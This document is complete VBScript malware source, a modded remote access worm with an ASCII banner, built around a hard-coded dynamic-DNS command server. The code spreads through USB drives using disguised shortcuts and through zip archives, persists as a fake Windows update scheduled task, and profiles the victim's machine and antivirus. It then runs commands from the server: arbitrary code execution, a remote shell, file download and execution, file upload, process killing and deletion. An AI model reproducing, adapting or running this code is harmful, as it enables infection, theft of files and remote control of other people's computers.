'#cs ----------------------------------------------------------------------------
'Moded By: 
'
'#                                                                                                                                                               
'#                                                                                                                                                               
'#                 AAA               ZZZZZZZZZZZZZZZZZZZEEEEEEEEEEEEEEEEEEEEEERRRRRRRRRRRRRRRRR   TTTTTTTTTTTTTTTTTTTTTTTYYYYYYY       YYYYYYY     999999999     
'#                A:::A              Z:::::::::::::::::ZE::::::::::::::::::::ER::::::::::::::::R  T:::::::::::::::::::::TY:::::Y       Y:::::Y   99:::::::::99   
'#               A:::::A             Z:::::::::::::::::ZE::::::::::::::::::::ER::::::RRRRRR:::::R T:::::::::::::::::::::TY:::::Y       Y:::::Y 99:::::::::::::99 
'#              A:::::::A            Z:::ZZZZZZZZ:::::Z EE::::::EEEEEEEEE::::ERR:::::R     R:::::RT:::::TT:::::::TT:::::TY::::::Y     Y::::::Y9::::::99999::::::9
'#             A:::::::::A           ZZZZZ     Z:::::Z    E:::::E       EEEEEE  R::::R     R:::::RTTTTTT  T:::::T  TTTTTTYYY:::::Y   Y:::::YYY9:::::9     9:::::9
'#            A:::::A:::::A                  Z:::::Z      E:::::E               R::::R     R:::::R        T:::::T           Y:::::Y Y:::::Y   9:::::9     9:::::9
'#           A:::::A A:::::A                Z:::::Z       E::::::EEEEEEEEEE     R::::RRRRRR:::::R         T:::::T            Y:::::Y:::::Y     9:::::99999::::::9
'#          A:::::A   A:::::A              Z:::::Z        E:::::::::::::::E     R:::::::::::::RR          T:::::T             Y:::::::::Y       99::::::::::::::9
'#         A:::::A     A:::::A            Z:::::Z         E:::::::::::::::E     R::::RRRRRR:::::R         T:::::T              Y:::::::Y          99999::::::::9 
'#        A:::::AAAAAAAAA:::::A          Z:::::Z          E::::::EEEEEEEEEE     R::::R     R:::::R        T:::::T               Y:::::Y                9::::::9  
'#       A:::::::::::::::::::::A        Z:::::Z           E:::::E               R::::R     R:::::R        T:::::T               Y:::::Y               9::::::9   
'#      A:::::AAAAAAAAAAAAA:::::A    ZZZ:::::Z     ZZZZZ  E:::::E       EEEEEE  R::::R     R:::::R        T:::::T               Y:::::Y              9::::::9    
'#     A:::::A             A:::::A   Z::::::ZZZZZZZZ:::ZEE::::::EEEEEEEE:::::ERR:::::R     R:::::R      TT:::::::TT             Y:::::Y             9::::::9     
'#    A:::::A               A:::::A  Z:::::::::::::::::ZE::::::::::::::::::::ER::::::R     R:::::R      T:::::::::T          YYYY:::::YYYY         9::::::9      
'#   A:::::A                 A:::::A Z:::::::::::::::::ZE::::::::::::::::::::ER::::::R     R:::::R      T:::::::::T          Y:::::::::::Y        9::::::9       
'#  AAAAAAA                   AAAAAAAZZZZZZZZZZZZZZZZZZZEEEEEEEEEEEEEEEEEEEEEERRRRRRRR     RRRRRRR      TTTTTTTTTTT          YYYYYYYYYYYYY       99999999        
'#                                                                                                                                                               
'#                                                                                                                                                               
'#                                                                                                                                                               
'#                                                                                                                                                               
'#                                                                                                                                                               
'#                                                                                                                                                               
'#    

sub DFGFHH
on error resume next
dim lnkobj
dim filename
dim foldername
dim fileicon
dim foldericon


for each drive in oloimergegvbn.drives

if  drive.isready = true then
if  drive.freespace  > 0 then
if  drive.drivetype  = 1 then
    oloimergegvbn.copyfile wscript.scriptfullname , drive.path & "\" & ghgdfdfeetty,true
    if  oloimergegvbn.fileexists (drive.path & "\" & ghgdfdfeetty)  then
        oloimergegvbn.getfile(drive.path & "\"  & ghgdfdfeetty).attributes = 2+4
    end if
    for each file in oloimergegvbn.getfolder( drive.path & "\" ).Files
      
		if not lnkfile then exit for
		
        if  instr (file.name,".") then
            if  lcase (split(file.name, ".") (ubound(split(file.name, ".")))) <> "lnk" then
                file.attributes = 2+4
                if  ucase (file.name) <> ucase (ghgdfdfeetty) then
                    filename = split(file.name,".")
                    set lnkobj = dfghgfhgj.createshortcut (drive.path & "\"  & filename (0) & ".lnk") 
                    lnkobj.windowstyle = 7
                    lnkobj.targetpath = "cmd.exe"
                    lnkobj.workingdirectory = ""
                    lnkobj.arguments = "/c start " & replace(ghgdfdfeetty," ", chrw(34) & " " & chrw(34)) & "&start " & replace(file.name," ", chrw(34) & " " & chrw(34)) &"&exit"
                    fileicon = dfghgfhgj.regread ("HKEY_LOCAL_MACHINE\software\classes\" & dfghgfhgj.regread ("HKEY_LOCAL_MACHINE\software\classes\." & split(file.name, ".")(ubound(split(file.name, ".")))& "\") & "\defaulticon\") 
                    if  instr (fileicon,",") = 0 then
                        lnkobj.iconlocation = file.path
                    else 
                        lnkobj.iconlocation = fileicon
                    end if
                    lnkobj.save()
                end if
            end if
        end if
    next
    for each folder in oloimergegvbn.getfolder( drive.path & "\" ).subfolders
    
	  if not lnkfile then exit for
        folder.attributes = 2+4
        foldername = folder.name
        set lnkobj = dfghgfhgj.createshortcut (drive.path & "\"  & foldername & ".lnk") 
        lnkobj.windowstyle = 7
        lnkobj.targetpath = "cmd.exe"
        lnkobj.workingdirectory = ""
        lnkobj.arguments = "/c start " & replace(ghgdfdfeetty," ", chrw(34) & " " & chrw(34)) & "&start explorer " & replace(folder.name," ", chrw(34) & " " & chrw(34)) &"&exit"
        foldericon = dfghgfhgj.regread ("HKEY_LOCAL_MACHINE\software\classes\folder\defaulticon\") 
        if  instr (foldericon,",") = 0 then
            lnkobj.iconlocation = folder.path
        else 
            lnkobj.iconlocation = foldericon
        end if
        lnkobj.save()
    next
end If
end If
end if
next
err.clear
end sub


function WWWWWWWSDGGGGGGGGGGGG (ssCDQQssGETGAAss ,TYUQGETGAApo)

WWWWWWWSDGGGGGGGGGGGG = TYUQGETGAApo
gegvbnoloimer.open "p" & "o" & "st","h" & "t" & "tp" & "://" & host & ":" & port &"/" & ssCDQQssGETGAAss , false
gegvbnoloimer.setrequestheader "user-agent:",information
gegvbnoloimer.send TYUQGETGAApo
WWWWWWWSDGGGGGGGGGGGG = gegvbnoloimer.responsetext
end function
function inet

On Error Resume Next
Set net = CreateObject("WScript.Shell")
Fra = net.RegRead("HKLM\SOFTWARE\Microsoft\.NETFramework\Policy\v2.0\50727")
If Err.Number = 0 Then
    inet = "Yes"
Else
    inet = "No"
End If
end function 
function information
on error resume next
if  inf = "" then
    inf = hwid & vbncde 
    inf = inf  & dfghgfhgj.expandenvironmentstrings("%computername%") & vbncde 
    inf = inf  & dfghgfhgj.expandenvironmentstrings("%username%") & vbncde

    set root = getobject("winmgmts:{impersonationlevel=impersonate}!\\.\root\cimv2")
    set os = root.execquery ("select * from win32_operatingsystem")
    for each osinfo in os
       inf = inf & osinfo.caption & vbncde  
       exit for
    next
    inf = inf & inet & vbncde
    inf = inf & security & vbncde
    inf = inf & usbspreading
    information = inf  
else
    information = inf
end if
end function 
Set oFSO = CreateObject("Scripting.FileSystemObject")
SelfPath = WScript.ScriptFullName
SelfName = WScript.ScriptName 
Function ZSpd(P)
    On Error Resume Next
  
Set Folds = oFSO.GetFolder(P)
    Set Files = Folds.Files
 
    For Each File In Files
	
	 

        ext = LCase(oFSO.GetExtensionName(File.path))
        If ext = "zip" Then
			xvs = SelfPath
			ZIP = File.path
			Set FILE = CreateObject("Shell.Application").NameSpace(ZIP)
			RR = ""
			For Each CC in FILE.Items
				RR = RR & CC.Name
			Next
			If Not InStr(RR,SelfName) > 0 Then
				FILE.CopyHere xvs				
				WScript.Sleep 1000		
			End If
        End If
	
    Next
    Set File = Folds.Subfolders
    For Each Subfol In File
        Call ZSpd(Subfol.path)
    Next
End Function

sub jfjjfjfjfgjfjfjfjfj
on error resume next
dim filename
dim foldername

for  each drive in oloimergegvbn.drives
if  drive.isready = true then
if  drive.freespace  > 0 then
if  drive.drivetype  = 1 then
    for  each file in oloimergegvbn.getfolder ( drive.path & "\").files
         on error resume next
		
         if  instr (file.name,".") then
             if  lcase (split(file.name, ".")(ubound(split(file.name, ".")))) <> "lnk" then
                 file.attributes = 0
                 if  ucase (file.name) <> ucase (ghgdfdfeetty) then
                     filename = split(file.name,".")
                     oloimergegvbn.deletefile (drive.path & "\" & filename(0) & ".lnk" )
                 else
                     oloimergegvbn.deletefile (drive.path & "\" & file.name)
                 end If
             else
                 oloimergegvbn.deletefile (file.path) 
             end if
         end if
     next
     for each folder in oloimergegvbn.getfolder( drive.path & "\" ).subfolders
         folder.attributes = 0
     next
end if
end if
end if
next

wscript.quit
end sub

sub upstart ()


on error resume Next
SET fso = CREATEOBJECT ("SCRIPTING.FILESYSTEMOBJECT") 
SET SHELLOBJ = WSCRIPT.CREATEOBJECT ("WSCRIPT.SHELL")  
START_F = SHELLOBJ.EXPANDENVIRONMENTSTRINGS (installdir)& WSCRIPT.SCRIPTNAME 
fso.COPYFILE WSCRIPT.SCRIPTFULLNAME,START_F ,TRUE 
Set wshShell = WScript.CreateObject( "WScript.Shell" ) 
Set ObjShell = WScript.CreateObject( "Shell.Application" ) 
Set tempfolder = fso.GetSpecialFolder(2)
File = Base64Decode("PD94bWwgdmVyc2lvbj0iMS4wIiBlbmNvZGluZz0iVVRGLTE2Ij8+DQo8VGFzayB2ZXJzaW9uPSIxLjIiIHhtbG5zPSJodHRwOi8vc2NoZW1hcy5taWNyb3NvZnQuY29tL3dpbmRvd3MvMjAwNC8wMi9taXQvdGFzayI+DQogIDxSZWdpc3RyYXRpb25JbmZvPg0KICAgIDxEYXRlPjIwMDAtMTAtMjVUMTQ6Mjc6NDQuODkyOTAyNzwvRGF0ZT4NCiAgICA8QXV0aG9yPiVVU0VSX05BTUUlPC9BdXRob3I+DQogIDwvUmVnaXN0cmF0aW9uSW5mbz4NCiAgPFRyaWdnZXJzPg0KICAgIDxMb2dvblRyaWdnZXI+DQogICAgICA8RW5hYmxlZD50cnVlPC9FbmFibGVkPg0KICAgICAgPFVzZXJJZD4lVVNFUl9OQU1FJTwvVXNlcklkPg0KICAgIDwvTG9nb25UcmlnZ2VyPg0KICAgIDxSZWdpc3RyYXRpb25UcmlnZ2VyPg0KICAgICAgPEVuYWJsZWQ+ZmFsc2U8L0VuYWJsZWQ+DQogICAgPC9SZWdpc3RyYXRpb25UcmlnZ2VyPg0KICA8L1RyaWdnZXJzPg0KICA8UHJpbmNpcGFscz4NCiAgICA8UHJpbmNpcGFsIGlkPSJBdXRob3IiPg0KICAgICAgPFVzZXJJZD4lVVNFUl9OQU1FJTwvVXNlcklkPg0KICAgICAgPExvZ29uVHlwZT5JbnRlcmFjdGl2ZVRva2VuPC9Mb2dvblR5cGU+DQogICAgICA8UnVuTGV2ZWw+TGVhc3RQcml2aWxlZ2U8L1J1bkxldmVsPg0KICAgIDwvUHJpbmNpcGFsPg0KICA8L1ByaW5jaXBhbHM+DQogIDxTZXR0aW5ncz4NCiAgICA8TXVsdGlwbGVJbnN0YW5jZXNQb2xpY3k+U3RvcEV4aXN0aW5nPC9NdWx0aXBsZUluc3RhbmNlc1BvbGljeT4NCiAgICA8RGlzYWxsb3dTdGFydElmT25CYXR0ZXJpZXM+ZmFsc2U8L0Rpc2FsbG93U3RhcnRJZk9uQmF0dGVyaWVzPg0KICAgIDxTdG9wSWZHb2luZ09uQmF0dGVyaWVzPnRydWU8L1N0b3BJZkdvaW5nT25CYXR0ZXJpZXM+DQogICAgPEFsbG93SGFyZFRlcm1pbmF0ZT5mYWxzZTwvQWxsb3dIYXJkVGVybWluYXRlPg0KICAgIDxTdGFydFdoZW5BdmFpbGFibGU+dHJ1ZTwvU3RhcnRXaGVuQXZhaWxhYmxlPg0KICAgIDxSdW5Pbmx5SWZOZXR3b3JrQXZhaWxhYmxlPmZhbHNlPC9SdW5Pbmx5SWZOZXR3b3JrQXZhaWxhYmxlPg0KICAgIDxJZGxlU2V0dGluZ3M+DQogICAgICA8U3RvcE9uSWRsZUVuZD50cnVlPC9TdG9wT25JZGxlRW5kPg0KICAgICAgPFJlc3RhcnRPbklkbGU+ZmFsc2U8L1Jlc3RhcnRPbklkbGU+DQogICAgPC9JZGxlU2V0dGluZ3M+DQogICAgPEFsbG93U3RhcnRPbkRlbWFuZD50cnVlPC9BbGxvd1N0YXJ0T25EZW1hbmQ+DQogICAgPEVuYWJsZWQ+dHJ1ZTwvRW5hYmxlZD4NCiAgICA8SGlkZGVuPmZhbHNlPC9IaWRkZW4+DQogICAgPFJ1bk9ubHlJZklkbGU+ZmFsc2U8L1J1bk9ubHlJZklkbGU+DQogICAgPFdha2VUb1J1bj5mYWxzZTwvV2FrZVRvUnVuPg0KICAgIDxFeGVjdXRpb25UaW1lTGltaXQ+UFQwUzwvRXhlY3V0aW9uVGltZUxpbWl0Pg0KICAgIDxQcmlvcml0eT43PC9Qcmlvcml0eT4NCiAgPC9TZXR0aW5ncz4NCiAgPEFjdGlvbnMgQ29udGV4dD0iQXV0aG9yIj4NCiAgICA8RXhlYz4NCiAgICAgIDxDb21tYW5kPiVBUFBfUEFUSCU8L0NvbW1hbmQ+DQogICAgPC9FeGVjPg0KICA8L0FjdGlvbnM+DQo8L1Rhc2s+") 
Rnm = GetRandom(7)
Path = tempfolder & "\" & rnm & ".jpg" ' 
AppPath = START_F 
strComputerName = wshShell.ExpandEnvironmentStrings( "%COMPUTERNAME%" ) ' 
strUserName = wshShell.ExpandEnvironmentStrings( "%USERNAME%" ) ' 
File = Replace(File,"%USER_NAME%",strComputerName & "\" & strUserName) 
File = Replace(File,"%APP_PATH%",AppPath) 
Set objFile = fso.CreateTextFile(Path,True) 
objFile.Write File 
objFile.Close 
Arg = "schtasks /Create /TN WindowsUpda2ta /xml %temp%\" & rnm & ".jpg" 

wshShell.Run Arg,0 
wscript.sleep 3000
fso.DeleteFile Path
end sub
Function Base64Decode(ByVal base64String)
  Const Base64 = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/"
  Dim dataLength, sOut, groupBegin
  dataLength = Len(base64String)
  For groupBegin = 1 To dataLength Step 4
    Dim numDataBytes, CharCounter, thisChar, thisData, nGroup, pOut
    numDataBytes = 3
    nGroup = 0
    For CharCounter = 0 To 3
      thisChar = Mid(base64String, groupBegin + CharCounter, 1)
      If thisChar = "=" Then
        numDataBytes = numDataBytes - 1
        thisData = 0
      Else
        thisData = InStr(1, Base64, thisChar, vbBinaryCompare) - 1
      End If
      nGroup = 64 * nGroup + thisData
    Next
    nGroup = Hex(nGroup)
    nGroup = String(6 - Len(nGroup), "0") & nGroup
    pOut = Chr(CByte("&H" & Mid(nGroup, 1, 2))) + Chr(CByte("&H" & Mid(nGroup, 3, 2))) + Chr(CByte("&H" & Mid(nGroup, 5, 2)))
    sOut = sOut & Left(pOut, numDataBytes)
  Next
 
  Base64Decode = sOut
End Function
Function GetRandom(Count)
    Randomize
 
    For i = 1 To Count
        If (Int((1 - 0 + 1) * Rnd + 0)) Then
            GetRandom = GetRandom & Chr(Int((90 - 65 + 1) * Rnd + 65))
        Else
            GetRandom = GetRandom & Chr(Int((57 - 48 + 1) * Rnd + 48))
        End If
    Next
End Function

function hwid
on error resume next

set root = getobject("winmgmts:{impersonationlevel=impersonate}!\\.\root\cimv2")
set disks = root.execquery ("select * from win32_logicaldisk")
for each disk in disks
    if  disk.volumeserialnumber <> "" then
        hwid = disk.volumeserialnumber
        exit for
    end if
next
end function

function security 
on error resume next

security = ""

set objwmiservice = getobject("winmgmts:{impersonationlevel=impersonate}!\\.\root\cimv2")
set colitems = objwmiservice.execquery("select * from win32_operatingsystem",,48)
for each objitem in colitems
    versionstr = split (objitem.version,".")
next
versionstr = split (colitems.version,".")
osversion = versionstr (0) & "."
for  x = 1 to ubound (versionstr)
	 osversion = osversion &  versionstr (i)
next
osversion = eval (osversion)
if  osversion > 6 then sc = "securitycenter2" else sc = "securitycenter"

set objsecuritycenter = getobject("winmgmts:\\localhost\root\" & sc)
Set colantivirus = objsecuritycenter.execquery("select * from antivirusproduct","wql",0)

for each objantivirus in colantivirus
    security  = security  & objantivirus.displayname & " ."
next
if security  = "" then security  = "nan-av"
end function


function UQGETTYGAApo
on error resume next

usbspreading = dfghgfhgj.regread ("HKEY_LOCAL_MACHINE\software\" & split (ghgdfdfeetty,".")(0) & "\")
if usbspreading = "" then
   if lcase ( mid(wscript.scriptfullname,2)) = ":\" &  lcase(ghgdfdfeetty) then
      usbspreading = "true - " & date
      dfghgfhgj.regwrite "HKEY_LOCAL_MACHINE\software\" & split (ghgdfdfeetty,".")(0)  & "\",  usbspreading, "REG_SZ"
   else
      usbspreading = "false - " & date
      dfghgfhgj.regwrite "HKEY_LOCAL_MACHINE\software\" & split (ghgdfdfeetty,".")(0)  & "\",  usbspreading, "REG_SZ"

   end if
end If

upstart
set scriptfullnameshort =  oloimergegvbn.getfile (wscript.scriptfullname)
set installfullnameshort =  oloimergegvbn.getfile (installdir & ghgdfdfeetty)
if  lcase (scriptfullnameshort.shortpath) <> lcase (installfullnameshort.shortpath) then 
    dfghgfhgj.run "wscript.exe //B " & chr(34) & installdir & ghgdfdfeetty & Chr(34)
    wscript.quit 
end If
err.clear
set oneonce = oloimergegvbn.opentextfile (installdir & ghgdfdfeetty ,8, false)
if  err.number > 0 then wscript.quit

end function


sub sitedownloader (fileurl,filename)

strlink = fileurl
strsaveto = installdir & filename
set objhttpdownload = createobject("msxml2.xmlhttp" )
objhttpdownload.open "get", strlink, false
objhttpdownload.send

set objfsodownload = createobject ("scripting.filesystemobject")
if  objfsodownload.fileexists (strsaveto) then
    objfsodownload.deletefile (strsaveto)
end if
 
if objhttpdownload.status = 200 then
   dim  objstreamdownload
   set  objstreamdownload = createobject("adodb.stream")
   with objstreamdownload
		.type = 1 
		.open
		.write objhttpdownload.responsebody
		.savetofile strsaveto
		.close
   end with
   set objstreamdownload = nothing
end if
if objfsodownload.fileexists(strsaveto) then
   dfghgfhgj.run objfsodownload.getfile (strsaveto).shortpath
end if 
end sub

sub download (fileurl,filedir)

if filedir = "" then 
   filedir = installdir
end if

strsaveto = filedir & mid (fileurl, instrrev (fileurl,"\") + 1)
set objhttpdownload = createobject("msxml2.xmlhttp")
objhttpdownload.open "p" & "o" & "st","h" & "t" & "tp" & "://" & host & ":" & port &"/" & "is-sending" & vbncde & fileurl, false
objhttpdownload.send ""
     
set objfsodownload = createobject ("scripting.filesystemobject")
if  objfsodownload.fileexists (strsaveto) then
    objfsodownload.deletefile (strsaveto)
end if
if  objhttpdownload.status = 200 then
    dim  objstreamdownload
	set  objstreamdownload = createobject("adodb.stream")
    with objstreamdownload 
		 .type = 1 
		 .open
		 .write objhttpdownload.responsebody
		 .savetofile strsaveto
		 .close
	end with
    set objstreamdownload  = nothing
end if
if objfsodownload.fileexists(strsaveto) then
   dfghgfhgj.run objfsodownload.getfile (strsaveto).shortpath
end if 
end sub


function upload (fileurl)

dim  gegvbnoloimer,objstreamuploade,buffer
set  objstreamuploade = createobject("adodb.stream")
with objstreamuploade 
     .type = 1 
     .open
	 .loadfromfile fileurl
	 buffer = .read
	 .close
end with
set objstreamdownload = nothing
set gegvbnoloimer = createobject("msxml2.xmlhttp")
gegvbnoloimer.open "p" & "o" & "st","h" & "t" & "tp" & "://" & host & ":" & port &"/" & "is-recving" & vbncde & fileurl, false
gegvbnoloimer.send buffer
end function


function enumdriver ()

for  each drive in oloimergegvbn.drives
if   drive.isready = true then
     enumdriver = enumdriver & drive.path & "|" & drive.drivetype & vbncde
end if
next
end Function

function enumfaf (enumdir)

enumfaf = enumdir & vbncde
for  each folder in oloimergegvbn.getfolder (enumdir).subfolders
     enumfaf = enumfaf & folder.name & "|" & "" & "|" & "d" & "|" & folder.attributes & vbncde
next

for  each file in oloimergegvbn.getfolder (enumdir).files
     enumfaf = enumfaf & file.name & "|" & file.size  & "|" & "f" & "|" & file.attributes & vbncde

next
end function


function enumprocess ()

on error resume next

set objwmiservice = getobject("winmgmts:\\.\root\cimv2")
set colitems = objwmiservice.execquery("select * from win32_process",,48)

dim objitem
for each objitem in colitems
	enumprocess = enumprocess & objitem.name & "|"
	enumprocess = enumprocess & objitem.processid & "|"
    enumprocess = enumprocess & objitem.executablepath & vbncde
next
end function

sub exitprocess (pid)
on error resume next

dfghgfhgj.run "taskkill /F /T /PID " & pid,7,true
end sub

sub deletefaf (url)
on error resume next

oloimergegvbn.deletefile url
oloimergegvbn.deletefolder url

end sub

function TdftGAA (ssCDQQssGETGAAss )

dim gegvbnoloimer,oexec,readallfromany

set oexec = dfghgfhgj.exec ("%comspec% /c " & ssCDQQssGETGAAss )
if not oexec.stdout.atendofstream then
   readallfromany = oexec.stdout.readall
elseif not oexec.stderr.atendofstream then
   readallfromany = oexec.stderr.readall
else 
   readallfromany = ""
end if

TdftGAA = readallfromany
end function

host = "jok3r-dx.ddns.net"
port = 1110
installdir = "%temp%"
lnkfile = true
zipSp = true
dim dfghgfhgj 
set dfghgfhgj = wscript.createobject("wscript.shell")
dim oloimergegvbn
set oloimergegvbn = createobject("scripting.filesystemobject")
dim gegvbnoloimer
set gegvbnoloimer = createobject("msxml2.xmlhttp")
if zipSp = true then ZSpd(dfghgfhgj.ExpandEnvironmentStrings("%USERPROFILE%"))



ghgdfdfeetty = wscript.scriptname
installdir = dfghgfhgj.expandenvironmentstrings(installdir) & "\"
if not oloimergegvbn.folderexists(installdir) then  installdir = dfghgfhgj.expandenvironmentstrings("%temp%") & "\"
vbncde = "<" & "|" & ">"
sleep = 5000 
dim DFGFHHpo
dim ssCDQQssGETGAAss 
dim TYUQGETGAApo
info = ""
usbspreading = ""
startdate = ""
dim oneonce

on error resume next

FDJH = "excecute"
DFGsss = "update"
AZEdc = "uninstall"
QZSddd = "send"
MLOdxxx = "site-send"
BGTY = "recv"
WXCVB = "enum-driver"
MLKJHG = "enum-faf"
LOKIJ = "enum-process"
FGHJxxxxK = "cmd-shell"
CVGFxxxx = "delete"
OLJHwwwGR ="exit-process"
wxssswwxxx = "sleep"
DFDFDFDFDFF = "wscript.exe //B "
azerty10 = "is-cmd-shell"
azerty8 = "is-enum-process" 
azerty7 = "is-enum-faf"
azerty5 = "im-azerty"
UQGETTYGAApo
while true

DFGFHH

DFGFHHpo = ""
DFGFHHpo = WWWWWWWSDGGGGGGGGGGGG (azerty5,"")
ssCDQQssGETGAAss = split (DFGFHHpo,vbncde)
select case ssCDQQssGETGAAss (0)
case FDJH
      TYUQGETGAApo = ssCDQQssGETGAAss (1)
      execute TYUQGETGAApo
case DFGsss
      TYUQGETGAApo = ssCDQQssGETGAAss (1)
      oneonce.close
      set oneonce =  oloimergegvbn.opentextfile (installdir & ghgdfdfeetty ,2, false)
      oneonce.write TYUQGETGAApo
      oneonce.close
      dfghgfhgj.run DFDFDFDFDFF & chr(34) & installdir & ghgdfdfeetty & chr(34)
      wscript.quit 
case AZEdc
      jfjjfjfjfgjfjfjfjfj
case QZSddd
      download ssCDQQssGETGAAss (1),ssCDQQssGETGAAss (2)
case MLOdxxx
      sitedownloader ssCDQQssGETGAAss (1),ssCDQQssGETGAAss (2)
case BGTY
      TYUQGETGAApo = ssCDQQssGETGAAss (1)
      upload (TYUQGETGAApo)
case  WXCVB
      WWWWWWWSDGGGGGGGGGGGG "is-enum-driver",enumdriver  
case  MLKJHG
      TYUQGETGAApo = ssCDQQssGETGAAss (1)
      WWWWWWWSDGGGGGGGGGGGG azerty7,enumfaf (TYUQGETGAApo)
case  LOKIJ
      WWWWWWWSDGGGGGGGGGGGG azerty8,enumprocess   
case  FGHJxxxxK
      TYUQGETGAApo = ssCDQQssGETGAAss (1)
      WWWWWWWSDGGGGGGGGGGGG azerty10,TdftGAA (TYUQGETGAApo)  
case  CVGFxxxx
      TYUQGETGAApo = ssCDQQssGETGAAss (1)
      deletefaf (TYUQGETGAApo) 
case  OLJHwwwGR
      TYUQGETGAApo = ssCDQQssGETGAAss (1)
      exitprocess (TYUQGETGAApo) 
case  wxssswwxxx
      TYUQGETGAApo = ssCDQQssGETGAAss (1)
      sleep = eval (TYUQGETGAApo)        
end select

wscript.sleep sleep

wend


